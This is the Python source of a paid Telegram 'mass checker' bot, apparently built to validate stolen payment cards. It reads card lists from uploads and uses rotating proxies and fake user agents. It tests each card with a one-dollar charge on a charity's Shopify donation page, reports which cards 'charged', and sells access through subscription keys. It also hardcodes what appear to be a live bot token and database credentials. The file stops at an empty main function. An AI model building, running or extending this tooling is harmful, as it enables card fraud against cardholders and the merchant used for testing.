import aiohttp
from bs4 import BeautifulSoup
from fake_useragent import UserAgent
import re
import json
import time
import asyncio
import random
import string
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, filters, ContextTypes
from pymongo import MongoClient
from datetime import datetime, timedelta
import logging
from typing import Optional, List, Dict, Tuple

# Configuration
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler(),
        logging.FileHandler('bot.log')
    ]
)
logger = logging.getLogger(__name__)

TOKEN = "8181079198:AAFIE0MVuCPWaC0w1HbBsHlCLJKKGpbDneM"  # Replace with your bot token
MONGO_URI = "mongodb+srv://ElectraOp:BGMI272@cluster0.1jmwb.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0"  # Replace with your MongoDB URI
OWNER_ID = 7593550190  # Replace with your Telegram user ID
USE_PROXIES = True  # Set to False to disable proxies
CONCURRENT_LIMIT = 3  # Max cards to check concurrently per user
TIMEOUT_SECONDS = 70  # Timeout between batches

# MongoDB Setup
try:
    mongo_client = MongoClient(MONGO_URI)
    db = mongo_client['fn_cc_checker']
    users_collection = db['users']
    keys_collection = db['keys']
    mongo_client.admin.command('ping')  # Test connection
    logger.info("MongoDB connection established")
except Exception as e:
    logger.error(f"Failed to connect to MongoDB: {str(e)}")
    raise

# Tier Limits
TIER_LIMITS = {
    'Gold': 500,
    'Platinum': 1000,
    'Co-Owner': 1500
}

# Proxy Management
def load_proxies() -> List[str]:
    if not USE_PROXIES:
        return []
    try:
        with open('proxies.txt', 'r') as f:
            proxies = [line.strip() for line in f if line.strip()]
        if not proxies:
            logger.warning("proxies.txt is empty")
            return []
        logger.info(f"Loaded {len(proxies)} proxies from proxies.txt")
        return proxies
    except FileNotFoundError:
        logger.error("proxies.txt not found")
        return []
    except Exception as e:
        logger.error(f"Error loading proxies: {str(e)}")
        return []

proxies = load_proxies()

async def get_proxy() -> Optional[dict]:
    if not proxies or not USE_PROXIES:
        return None
    proxy = random.choice(proxies)
    try:
        return {'http': proxy, 'https': proxy}
    except Exception as e:
        logger.warning(f"Invalid proxy format: {proxy}. Error: {str(e)}")
        return None

# Utility Functions
def find_between(s: str, first: str, last: str) -> str:
    try:
        start = s.index(first) + len(first)
        end = s.index(last, start)
        return s[start:end]
    except ValueError:
        logger.error(f"Failed to find substring between '{first}' and '{last}'")
        return ""

def parse_card(card_input: str) -> tuple[Optional[str], Optional[str], Optional[str], Optional[str]]:
    try:
        cc_raw, mm, yy, cvc = card_input.strip().split("|")
        cc = " ".join(cc_raw[i:i+4] for i in range(0, len(cc_raw), 4))
        mm = str(int(mm))
        yy = "20" + yy if len(yy) == 2 else yy
        return cc, mm, yy, cvc
    except Exception as e:
        logger.error(f"Card parsing failed: {str(e)}")
        return None, None, None, None

emails = ["nicochan275@gmail.com"]
first_names = ["John", "Emily", "Alex", "Nico", "Tom", "Sarah", "Liam"]
last_names = ["Smith", "Johnson", "Miller", "Brown", "Davis", "Wilson", "Moore"]

# Core Card Checking Logic
async def sh(message: str, proxy_used: bool = False) -> Tuple[str, bool]:
    start_time = time.time()
    text = message.strip()
    pattern = r'(\d{16})[^\d]*(\d{2})[^\d]*(\d{2,4})[^\d]*(\d{3})'
    match = re.search(pattern, text)

    if not match:
        logger.error("Invalid card format detected")
        return "Invalid card format. Please provide a valid card number, month, year, and cvv.", proxy_used

    n = match.group(1)
    if not n or len(n) != 16:
        logger.error("Invalid card number length")
        return "Invalid card number.", proxy_used
    cc = " ".join(n[i:i+4] for i in range(0, len(n), 4))
    mm = match.group(2)
    mm = str(int(mm))
    yy = match.group(3)
    if len(yy) == 4 and yy.startswith("20"):
        yy = yy[2:]
    elif len(yy) == 2:
        yy = yy
    else:
        logger.error("Invalid year format in card details")
        return "Invalid year format.", proxy_used
    cvc = match.group(4)

    full_card = f"{n}|{mm}|{yy}|{cvc}"

    ua = UserAgent()
    user_agent = ua.random
    remail = random.choice(emails)
    rfirst = random.choice(first_names)
    rlast = random.choice(last_names)

    async with aiohttp.ClientSession() as r:
        proxy = await get_proxy()
        proxy_used = proxy is not None
        try:
            async with r.get(f'https://bins.antipublic.cc/bins/{n[:6]}', proxy=proxy) as res:
                if res.status == 200:
                    logger.info(f"BIN lookup successful for card {n[:6]}: Status 200 OK")
                    z = await res.json()
                    bin_info = z.get('bin', 'Unknown')
                    bank = z.get('bank_name', 'Unknown')
                    brand = z.get('brand', 'Unknown')
                    card_type = z.get('type', 'Unknown')
                    level = z.get('level', 'Unknown')
                    country = z.get('country_name', 'Unknown')
                    flag = z.get('country_flag', '')
                    currency = z.get('country_currencies', ['Unknown'])[0]
                else:
                    logger.error(f"BIN lookup failed for card {n[:6]}: Status {res.status}")
                    return f"BIN Lookup failed: Status {res.status}", proxy_used
        except Exception as e:
            logger.error(f"BIN lookup error: {str(e)}. Proxy: {proxy}")
            proxy_used = False
            return f"BIN Lookup failed: {str(e)}", proxy_used

        url = "https://www.buildingnewfoundations.com/cart/add.js"
        headers = {
            'authority': 'www.buildingnewfoundations.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://www.buildingnewfoundations.com',
            'referer': 'https://www.buildingnewfoundations.com/products/general-donation-specify-amount',
            'user-agent': user_agent,
        }
        data = {
            'form_type': 'product',
            'utf8': '✓',
            'id': '39555780771934',
            'quantity': '1',
            'product-id': '6630341279838',
            'section-id': 'product-template',
        }
        try:
            async with r.post(url, headers=headers, data=data, proxy=proxy) as response:
                if response.status != 200:
                    logger.error(f"Cart add failed: Status {response.status}")
                    return f"Cart add failed: Status {response.status}", proxy_used
        except Exception as e:
            logger.error(f"Cart add error: {str(e)}. Proxy: {proxy}")
            proxy_used = False
            return f"Cart add failed: {str(e)}", proxy_used

        headers = {
            'authority': 'www.buildingnewfoundations.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'referer': 'https://www.buildingnewfoundations.com/products/general-donation-specify-amount',
            'user-agent': user_agent,
        }
        try:
            async with r.get('https://www.buildingnewfoundations.com/cart.js', headers=headers, proxy=proxy) as response:
                raw = await response.text()
                if response.status == 200:
                    try:
                        res_json = json.loads(raw)
                        tok = res_json.get('token', '')
                    except json.JSONDecodeError as e:
                        logger.error(f"Cart JSON decode error: {str(e)}")
                        return f"Cart retrieval failed: Invalid JSON", proxy_used
                else:
                    logger.error(f"Cart retrieval failed: Status {response.status}")
                    return f"Cart retrieval failed: Status {response.status}", proxy_used
        except Exception as e:
            logger.error(f"Cart retrieval error: {str(e)}")
            proxy_used = False
            return f"Cart retrieval failed: {str(e)}", proxy_used

        headers = {
            'authority': 'www.buildingnewfoundations.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://www.buildingnewfoundations.com',
            'referer': 'https://www.buildingnewfoundations.com/cart',
            'user-agent': user_agent,
        }
        data = {
            'updates[]': '1',
            'checkout': 'Check out',
        }
        try:
            async with r.post(
                'https://www.buildingnewfoundations.com/cart',
                headers=headers,
                data=data,
                allow_redirects=True,
                proxy=proxy
            ) as response:
                text = await response.text()
                if response.status == 200:
                    x = find_between(text, 'serialized-session-id="', '"')
                    queue_token = find_between(text, '"queueToken":"', '"')
                    stableid = find_between(text, 'stableId":"', '"')
                    paymentmethod_id = find_between(text, 'paymentMethodId":"', '"')
                else:
                    logger.error(f"Checkout initiation failed: Status {response.status}")
                    return f"Checkout failed: Status {response.status}", proxy_used
        except Exception as e:
            logger.error(f"Checkout error: {str(e)}")
            proxy_used = False
            return f"Checkout failed: {str(e)}", proxy_used

        headers = {
            'authority': 'checkout.payments.shopify.com',
            'accept': 'application/json',
            'content-type': 'application/json',
            'origin': 'https://checkout.payments.shopify.com',
            'user-agent': user_agent,
        }
        json_data = {
            'credit_card': {
                'number': n,
                'month': mm,
                'year': yy,
                'verification_value': cvc,
                'name': f'{rfirst} {rlast}',
            },
            'payment_session_scope': 'www.buildingnewfoundations.com',
        }
        try:
            async with r.post('https://checkout.payments.shopify.com/sessions', headers=headers, json=json_data, proxy=proxy) as response:
                if response.status == 200:
                    sid = (await response.json()).get('id')
                else:
                    logger.error(f"Payment session failed: Status {response.status}")
                    return f"Payment token failed: Status {response.status}", proxy_used
        except Exception as e:
            logger.error(f"Payment session error: {str(e)}")
            proxy_used = False
            return f"Payment token failed: {str(e)}", proxy_used

        headers = {
            'authority': 'www.buildingnewfoundations.com',
            'accept': 'application/json',
            'content-type': 'application/json',
            'origin': 'https://www.buildingnewfoundations.com',
            'user-agent': user_agent,
            'x-session-id': x,
        }
        params = {
            'operationName': 'SubmitPayment',
        }
        json_data = {
            'query': 'mutation SubmitPayment($input: PaymentInput!) { submitPayment(input: $input) { ... on SubmitSuccess { receipt { orderId } } ... on SubmitFailed { error { message } } } }',
            'variables': {
                'input': {
                    'sessionId': x,
                    'queueToken': queue_token,
                    'payment': {
                        'method': {
                            'id': paymentmethod_id,
                            'sessionId': sid,
                            'billingAddress': {
                                'address1': '127 Allen St',
                                'city': 'New York',
                                'countryCode': 'US',
                                'postalCode': '10080',
                                'company': '123',
                                'firstName': 'Nick',
                                'lastName': 'Chen',
                                'province': 'NY',
                                'phone': '9715551234',
                            },
                        },
                        'amount': {
                            'amount': '1.00',
                            'currencyCode': 'USD'
                        },
                    },
                    'items': [{
                        'id': stableid,
                        'variantId': 'gid://shopify/ProductVariant/39555780771934',
                        'quantity': 1,
                        'price': {
                            'amount': '1.00',
                            'currencyCode': 'USD'
                        }
                    }],
                    'buyer': {
                        'email': remail,
                        'countryCode': 'US',
                    },
                }
            }
        }
        try:
            async with r.post(
                'https://www.buildingnewfoundations.com/api/checkout',
                params=params,
                headers=headers,
                json=json_data,
                proxy=proxy
            ) as response:
                raw = await response.text()
                if response.status == 200:
                    res_json = json.loads(raw)
                    receipt = res_json.get('data', {}).get('submitPayment', {}).get('receipt')
                    if receipt:
                        rid = receipt.get('orderId')
                    else:
                        logger.error("No order ID in response")
                        return f"Payment submission failed: No order ID", proxy_used
                else:
                    logger.error(f"Payment submission failed: Status {response.status}")
                    return f"Payment submission failed: Status {response.status}", proxy_used
        except Exception as e:
            logger.error(f"Payment submission error: {str(e)}")
            proxy_used = False
            return f"Payment submission failed: {str(e)}", proxy_used

        headers = {
            'authority': 'www.buildingnewfoundations.com',
            'accept': 'application/json',
            'content-type': 'application/json',
            'origin': 'https://www.buildingnewfoundations.com',
            'user-agent': user_agent,
            'x-session-id': x,
        }
        params = {
            'operationName': 'PollStatus',
        }
        json_data = {
            'query': 'query PollStatus($orderId: ID!) { order(id: $orderId) { status confirmation { id status message } } }',
            'variables': {'orderId': rid},
        }
        elapsed_time = time.time() - start_time
        max_retries = 10
        for attempt in range(max_retries):
            try:
                async with r.post(
                    'https://www.buildingnewfoundations.com/api',
                    params=params,
                    headers=headers,
                    json=json_data,
                    proxy=proxy
                ) as response:
                    raw = await response.text()
                    if response.status != 200:
                        logger.error(f"Poll attempt {attempt + 1} failed: Status {response.status}")
                        continue
                    res_json = json.loads(raw)
                    status = res_json.get('data', {}).get('order', {}).get('status', '')
                    message = res_json.get('data', {}).get('order', {}).get('confirmation', {}).get('message', '')
                    if 'CONFIRMED' in status.upper():
                        logger.info(f"Card {full_card}: Charged")
                        return (f"Card: {full_card}\n"
                                f"Status: Charged🔧\n"
                                f"Response: {message or 'Order confirmed'}\n\n"
                                f"Details: {card_type} - {level} - {brand}\n"
                                f"Bank: {bank}\n"
                                f"Country: {country}{flag} - {currency}\n\n"
                                f"Gateway: Shopify Payments\n"
                                f"Taken: {elapsed_time:.2f}s\n"
                                f"Bot by: @FN0P"), proxy_used
                    elif 'ACTION_REQUIRED' in status.upper():
                        logger.info(f"Card {full_card}: Approved")
                        return (f"Card: {full_card}\n"
                                f"Status: Approved✅\n"
                                f"Response: {message or 'Action required'}\n\n"
                                f"Details: {card_type} - {level} - {brand}\n"
                                f"Bank: {bank}\n"
                                f"Country: {country}{flag} - {currency}\n\n"
                                f"Gateway: Shopify Payments\n"
                                f"Taken: {elapsed_time:.2f}s\n"
                                f"Bot by: @FN0P"), proxy_used
                    elif 'PROCESSING' in status.upper():
                        logger.info(f"Card {full_card}: Processing, retry {attempt + 1}")
                        await asyncio.sleep(1)
                        continue
                    else:
                        logger.error(f"Card {full_card}: Declined: {message}")
                        return (f"Card: {full_card}\n"
                                f"Status: Declined❌\n"
                                f"Response: {message or 'Failed'}\n\n"
                                f"Details: {card_type} - {level} - {brand}\n"
                                f"Bank: {bank}\n"
                                f"Country: {country}{flag} - {currency}\n\n"
                                f"Gateway: Shopify Payments\n"
                                f"Taken: {elapsed_time:.2f}s\n"
                                f"Bot by: @FN0P"), proxy_used
            except Exception as e:
                logger.error(f"Poll error attempt {attempt + 1}: {str(e)}")
                proxy_used = False
                if attempt == max_retries - 1:
                    return (f"Card: {full_card}\n"
                            f"Status: Declined❌\n"
                            f"Response: Polling failed\n\n"
                            f"Details: {card_type} - {level} - {brand}\n"
                            f"Bank: {bank}\n"
                            f"Country: {country}{flag} - {currency}\n\n"
                            f"Gateway: Shopify Payments\n"
                            f"Taken: {elapsed_time:.2f}s\n"
                            f"Bot by: @FN0P"), proxy_used
            await asyncio.sleep(1)
        return (f"Card: {full_card}\n"
                f"Status: Declined❌\n"
                f"Response: Processing timeout\n\n"
                f"Details: {card_type} - {level} - {brand}\n"
                f"Bank: {bank}\n"
                f"Country: {country}{flag} - {currency}\n\n"
                f"Gateway: Shopify Payments\n"
                f"Taken: {elapsed_time:.2f}s\n"
                f"Bot by: @FN0P"), proxy_used

# Key System
def generate_key() -> str:
    part1 = ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))
    part2 = ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))
    return f"FN-SHOPIFY-{part1}-{part2}"

def check_subscription(user_id: int) -> tuple[bool, Optional[str], Optional[datetime]]:
    user = users_collection.find_one({'user_id': str(user_id)})
    if not user or not user.get('subscription_end') or user['subscription_end'] < datetime.utcnow():
        return None, None, False
    return True, user['tier'], user['subscription_end']

async def genkey(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("You are not authorized to use this command.")
        logger.warning(f"Unauthorized /genkey attempt by user {update.effective_user.id}")
        return
    if len(context.args) != 3:
        await update.message.reply_text("Usage: /genkey <tier> <days> <quantity>\nTiers: Gold, Platinum, Co-Owner")
        logger.warning(f"Invalid /genkey args by user {update.effective_user.id}")
        return
    tier, days_str, quantity_str = context.args
    if tier not in TIER_LIMITS:
        await update.message.reply_text("Invalid tier. Use: Gold, Platinum, Co-Owner")
        logger.warning(f"Invalid tier {tier} by user {update.effective_user.id}")
        return
    try:
        days = int(days_str)
        quantity = int(quantity_str)
        if days <= 0 or quantity <= 0:
            raise ValueError
    except ValueError:
        await update.message.reply_text("Days and quantity must be positive integers.")
        logger.warning(f"Invalid days/quantity by user {update.effective_user.id}")
        return

    keys = []
    for _ in range(quantity):
        key = generate_key()
        keys_collection.insert_one({
            'key_id': key,
            'tier': tier,
            'days': days,
            'used': False,
            'created_at': datetime.utcnow()
        })
        keys.append(key)

    keys_text = "\n➔ ".join(keys)
    await update.message.reply_text(
        f"**Generated Key(s)** ✅\n\n"
        f"**Amount**: {quantity}\n\n"
        f"➔ {keys_text}\n"
        f"**Plan**: {tier} ({days} days)\n\n"
        f"**To Redeem**:\nUse /redeem <key>",
        parse_mode='Markdown'
    )
    logger.info(f"User {update.effective_user.id} generated {quantity} {tier} keys for {days} days")

async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not context.args:
        await update.message.reply_text("Usage: /redeem <key>")
        logger.warning(f"User {user_id} attempted /redeem without key")
        return
    key = context.args[0]
    key_data = keys_collection.find_one({'key_id': key, 'used': False})
    if not key_data:
        await update.message.reply_text("Invalid or used key.")
        logger.warning(f"User {user_id} attempted to redeem invalid key {key}")
        return

    tier = key_data['tier']
    days = key_data['days']
    subscription_end = datetime.utcnow() + timedelta(days=days)

    users_collection.update_one(
        {'user_id': str(user_id)},
        {'$set': {
            'user_id': str(user_id),
            'tier': tier,
            'subscription_end': subscription_end
        }},
        upsert=True
    )
    keys_collection.update_one(
        {'key_id': key},
        {'$set': {'used': True, 'used_by': str(user_id), 'used_at': datetime.utcnow()}}
    )

    await update.message.reply_text(
        f"**Subscription Activated!** 🎉\n\n"
        f"**Plan**: {tier} ({days} days)\n\n"
        f"Thank you for subscribing!",
        parse_mode='Markdown'
    )
    logger.info(f"User {user_id} redeemed key {key} for {tier} ({days} days)")

async def delkey(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("You are not authorized to use this command.")
        logger.warning(f"Unauthorized /delkey attempt by user {update.effective_user.id}")
        return
    if not context.args:
        await update.message.reply_text("Usage: /delkey <user_id>")
        logger.warning(f"Invalid /delkey args by user {update.effective_user.id}")
        return
    try:
        user_id = int(context.args[0])
    except ValueError:
        await update.message.reply_text("Invalid user ID.")
        logger.warning(f"Invalid user_id by user {update.effective_user.id}")
        return

    result = users_collection.delete_one({'user_id': str(user_id)})
    if result.deleted_count:
        await update.message.reply_text(f"Subscription for user {user_id} deleted.")
        logger.info(f"User {user_id} subscription deleted by {update.effective_user.id}")
    else:
        await update.message.reply_text(f"No subscription found for user {user_id}.")
        logger.info(f"No subscription for user {user_id} by {update.effective_user.id}")

async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("You are not authorized to use this command.")
        logger.warning(f"Unauthorized /broadcast attempt by user {update.effective_user.id}")
        return
    if not context.args:
        await update.message.reply_text("Usage: /broadcast <message>")
        logger.warning(f"Invalid /broadcast args by user {update.effective_user.id}")
        return
    message = ' '.join(context.args)
    users = users_collection.find({'subscription_end': {'$gte': datetime.utcnow()}})
    sent = 0
    failed = 0

    for user in users:
        try:
            await context.bot.send_message(chat_id=user['user_id'], text=message)
            sent += 1
            await asyncio.sleep(0.05)
        except Exception as e:
            logger.error(f"Failed to broadcast to user {user['user_id']}: {str(e)}")
            failed += 1

    await update.message.reply_text(f"Broadcast sent to {sent} users. Failed: {failed}.")
    logger.info(f"Broadcast by {update.effective_user.id} to {sent} users, {failed} failed")

# Telegram Handlers
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("Upload File", callback_data='upload_file')],
        [InlineKeyboardButton("Cancel Batch", callback_data='cancel_batch')],
        [InlineKeyboardButton("Help", callback_data='help')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        "🔍 **Welcome to FN Mass Checker!**\n\n"
        "🔖 Use /sh to check a single card\n"
        "🛑 Use /stop to stop checking\n"
        "🔑 Use /redeem <key> to activate\n"
        "📁 Upload a .txt file or use the button below:",
        parse_mode='Markdown',
        reply_markup=reply_markup
    )
    logger.info(f"User {update.effective_user.id} started bot")

async def single_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != OWNER_ID:
        has_subscription, _, _ = check_subscription(user_id)
        if not has_subscription:
            await update.message.reply_text("You need an active subscription. Use /redeem <key>")
            logger.warning(f"User {user_id} attempted /sh without subscription")
            return
    if not context.args:
        await update.message.reply_text("Usage: /sh <card>|<mm>|<yy>|<cvc>")
        logger.warning(f"User {user_id} attempted /sh without card")
        return
    card = ' '.join(context.args)
    checking_msg = await update.message.reply_text("🔍 Checking card...")
    logger.info(f"User {user_id} checking card: {card}")
    try:
        result, proxy_used = await sh(card)
        await context.bot.delete_message(chat_id=update.effective_chat.id, message_id=checking_msg.message_id)
    except Exception as e:
        logger.error(f"Card check failed for user {user_id}: {str(e)}")
        await context.bot.delete_message(chat_id=update.effective_chat.id, message_id=checking_msg.message_id)
        await update.message.reply_text("Error checking card.")
        return

    lines = result.split('\n')
    full_card = lines[0].split('Card: ')[1]
    response = lines[2].split('Response: ')[1]
    card_info = lines[4].split('Details: ')[1]
    issuer = lines[5].split('Bank: ')[1]
    country = lines[6].split('Country: ')[1]

    checked_by = f"<a href='tg://user?id={user_id}'>{update.effective_user.first_name}</a>"
    proxy_status = "Live ✅" if proxy_used else "Dead ❌"

    if "Charged" in result or "Approved" in result:
        await update.message.reply_text(
            f"**Charged 1$** 🔥\n\n"
            f"[⚡] **Card**: <code>{full_card}</code>\n"
            f"[⚡] **Gateway**: Shopify Payments\n"
            f"[⚡] **Response**: {response}\n\n"
            f"[⚖] **Info**: {card_info}\n"
            f"[⚖] **Issuer**: {issuer} 🏦\n"
            f"[⚖] **Country**: {country}\n\n"
            f"[🔍] **Proxy**: {proxy_status}\n"
            f"[🔍] **Checked By**: {checked_by}\n"
            f"[🎖] **Bot**: @FN0P",
            parse_mode='HTML'
        )
        logger.info(f"User {user_id} card check passed: {full_card}")
    else:
        await update.message.reply_text(
            f"**Declined** ❌\n\n"
            f"[⚡] **Card**: <code>{full_card}</code>\n"
            f"[⚡] **Gateway**: Shopify Payments\n"
            f"[⚡] **Response**: {response}\n\n"
            f"[⚖] **Info**: {card_info}\n"
            f"[⚖] **Issuer**: {issuer} 🏦\n"
            f"[⚖] **Country**: {country}\n\n"
            f"[🔍] **Proxy**: {proxy_status}\n"
            f"[🔍] **Checked By**: {checked_by}\n"
            f"[🎖] **Bot**: @FN0P",
            parse_mode='HTML'
        )
        logger.info(f"User {user_id} card check failed: {full_card}")

checking_tasks: Dict[int, dict] = {}

async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id in checking_tasks:
        checking_tasks[user_id]['stop'] = True
        await update.message.reply_text("Checking stopped.")
        logger.info(f"User {user_id} stopped batch")
    else:
        await update.message.reply_text("No active batch to stop.")
        logger.info(f"User {user_id} attempted to stop no batch")

async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    if query.data == 'upload_file':
        await query.edit_message_text("Upload your .txt file.")
        logger.info(f"User {user_id} requested file upload")
    elif query.data == 'cancel_batch':
        if user_id in checking_tasks:
            checking_tasks[user_id]['stop'] = True
            await query.edit_message_text("Batch cancelled.")
            logger.info(f"User {user_id} cancelled batch")
        else:
            await query.edit_message_text("No active batch to cancel.")
            logger.info(f"User {user_id} attempted to cancel no batch")
    elif query.data == 'help':
        await query.edit_message_text(
            "Use /sh to check a card, /stop to stop batch, "
            "/redeem <key> to activate, or upload a .txt file."
        )
        logger.info(f"User {user_id} viewed help")

async def batch_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    if query.data == 'stop_batch':
        if user_id in checking_tasks:
            checking_tasks[user_id]['stop'] = True
            await query.edit_message_text("Batch stopped.")
            logger.info(f"User {user_id} stopped batch")
        else:
            await query.message.reply_text("No active batch to stop.")
            logger.info(f"User {user_id} attempted to stop no batch")
    elif query.data in ['charged', 'declined', 'total', 'response']:
        logger.info(f"User {user_id} clicked {query.data} button")

async def process_batch(user_id: int, cards: List[str], update: Update, context: ContextTypes.DEFAULT_TYPE, status_msg_id: int):
    total = len(cards)
    charged = 0
    declined = 0
    start_time = time.time()
    charged_cards = []
    checked_by = f"<a href='tg://user?id={user_id}'>{update.effective_user.first_name}</a>"

    async def check_card(card: str) -> Tuple[str, bool]:
        try:
            return await sh(card)
        except Exception as e:
            logger.error(f"Card check error for user {user_id}: {str(e)}")
            return f"Error: {str(e)}", False

    while cards and not checking_tasks.get(user_id, {}).get('stop', False):
        batch = cards[:CONCURRENT_LIMIT]
        cards = cards[CONCURRENT_LIMIT:]
        tasks = [check_card(card) for card in batch]
        results = await asyncio.gather(*tasks)

        for card, (result, proxy_used) in zip(batch, results):
            if checking_tasks.get(user_id, {}).get('stop', False):
                break
            if "Error:" in result:
                declined += 1
                continue

            lines = result.split('\n')
            full_card = lines[0].split('Card: ')[1]
            response = lines[2].split('Response: ')[1]
            card_info = lines[4].split('Details: ')[1]
            issuer = lines[5].split('Bank: ')[1]
            country = lines[6].split('Country: ')[1]
            proxy_status = "Live ✅" if proxy_used else "Dead ❌"

            if "Charged" in result or "Approved" in result:
                charged += 1
                charged_cards.append(full_card)
                await context.bot.send_message(
                    chat_id=update.effective_chat.id,
                    text=f"✅ **Charged 1$** 🔥\n\n"
                    f"[⚡] **Card**: <code>{full_card}</code>\n"
                    f"[⚡] **Gateway**: Shopify Payments\n"
                    f"[⚡] **Response**: {response}\n\n"
                    f"[⚖] **Info**: {card_info}\n"
                    f"[⚖] **Issuer**: {issuer} 🏦\n"
                    f"[⚖] **Country**: {country}\n\n"
                    f"[🔍] **Proxy**: {proxy_status}\n"
                    f"[🔍] **Checked By**: {checked_by}\n"
                    f"[🎖] **Bot**: @FN0P",
                    parse_mode='HTML'
                )
                logger.info(f"User {user_id} batch card passed: {full_card}")
            else:
                declined += 1
                await context.bot.send_message(
                    chat_id=update.effective_chat.id,
                    text=f"❌ **Declined**\n\n"
                         f"[⚡] **Card**: <code>{full_card}</code>\n"
                         f"[⚡] **Gateway**: Shopify Payments\n"
                         f"[⚡] **Response**: {response}\n\n"
                         f"[⚖] **Info**: {card_info}\n"
                         f"[⚖] **Issuer**: {issuer} 🏦\n"
                         f"[⚖] **Country**: {country}\n\n"
                         f"[🔍] **Proxy**: {proxy_status}\n"
                         f"[🔍] **Checked By**: {checked_by}\n"
                         f"[🎖] **Bot**: @FN0P",
                    parse_mode='HTML'
                )
                logger.info(f"User {user_id} batch card failed: {full_card}")

            keyboard = [
                [InlineKeyboardButton(f"Charged: {charged} 🔥", callback_data='charged')],
                [InlineKeyboardButton(f"Declined: {declined} ❌", callback_data='declined')],
                [InlineKeyboardButton(f"Total: {total} 💳", callback_data='total')],
                [InlineKeyboardButton("Stop", callback_data='stop_batch')],
                [InlineKeyboardButton(f"Response: {response}", callback_data='response')]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            try:
                await context.bot.edit_message_text(
                    chat_id=update.effective_chat.id,
                    message_id=status_msg_id,
                    text=f"🔍 **Processing Cards**\n\n"
                         f"Progress: {charged + declined}/{total}\n"
                         f"[🎖] **Bot**: @FN0P",
                    reply_markup=reply_markup,
                    parse_mode='HTML'
                )
            except Exception as e:
                logger.warning(f"Status update failed for user {user_id}: {str(e)}")

        if cards and not checking_tasks.get(user_id, {}).get('stop', False):
            try:
                await context.bot.edit_message_text(
                    chat_id=update.effective_chat.id,
                    message_id=status_msg_id,
                    text=f"⏳ **Waiting {TIMEOUT_SECONDS}s for next batch**n\n"
                         f"[🎖] **Bot**: @FN0P",
                    reply_markup=reply_markup,
                    parse_mode='HTML'
                )
            except Exception as e:
                logger.warning(f"Timeout update failed for user {user_id}: {str(e)}")
            await asyncio.sleep(TIMEOUT_SECONDS)

    elapsed = time.time() - start_time
    result_text = (f"✅ **Batch Completed**n\n\n"
                   f"**Total**: {total}\n"
                   f"**Charged**: {charged} 🔥\n"
                   f"**Declined**: {declined} ❌\n"
                   f"**Time Taken**: {elapsed:.2f}s")
    if charged_cards:
        result_text += f"\n\n**Charged Cards**:\n" + "\n".join(charged_cards)
    try:
        await context.bot.edit_message_text(
            chat_id=update.effective_chat.id,
            message_id=status_msg_id,
            text=result_text,
            reply_markup=None,
            parse_mode='Markdown'
        )
    except Exception as e:
        logger.warning(f"Completion message failed for user {user_id}: {str(e)}")
    logger.info(f"User {user_id} batch done: {charged} charged, {declined} declined, {total} total")
    if user_id in checking_tasks:
        del checking_tasks[user_id]

async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != OWNER_ID:
        has_subscription, tier, _ = check_subscription(user_id)
        if not has_subscription:
            await update.message.reply_text("You need an active subscription. Use /redeem <key>")
            logger.warning(f"User {user_id} attempted file upload without subscription")
            return
    if not update.message.document or not update.message.document.file_name.endswith('.txt'):
        await update.message.reply_text("Please upload a .txt file.")
        logger.warning(f"User {user_id} uploaded invalid file")
        return

    file = await update.message.document.get_file()
    try:
        file_content = await file.download_as_bytearray()
        cards = [line.strip() for line in file_content.decode('utf-8').splitlines() if line.strip()]
    except Exception as e:
        logger.error(f"File read error for user {user_id}: {str(e)}")
        await update.message.reply_text(f"Failed to read file: {str(e)}")
        return

    total = len(cards)
    if user_id != OWNER_ID and total > TIER_LIMITS.get(tier, 0):
        await update.message.reply_text(f"Your {tier} plan allows {TIER_LIMITS[tier]} cards max.")
        logger.warning(f"User {user_id} exceeded {tier} limit with {total} cards")
        return

    if user_id in checking_tasks:
        await update.message.reply_text("You have an active batch. Use /stop to cancel it.")
        logger.warning(f"User {user_id} attempted batch while another active")
        return

    checking_tasks[user_id] = {'stop': False}
    logger.info(f"User {user_id} started batch with {total} cards")

    keyboard = [
        [InlineKeyboardButton("Charged: 0 🔥", callback_data='charged')],
        [InlineKeyboardButton("Declined: 0 ❌", callback_data='declined')],
        [InlineKeyboardButton(f"Total: {total} 💳", callback_data='total')],
        [InlineKeyboardButton("Stop", callback_data='stop_batch')],
        [InlineKeyboardButton("Response: Starting...", callback_data='response')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    msg = await update.message.reply_text(
        text="🔍 **Processing Started**\n\n[🎖] **Bot**: @FN0P",
        reply_markup=reply_markup,
        parse_mode='HTML'
    )
    checking_tasks[user_id]['message_id'] = msg.message_id

    asyncio.create_task(process_batch(user_id, cards, update, context, msg.message_id))

async def main():
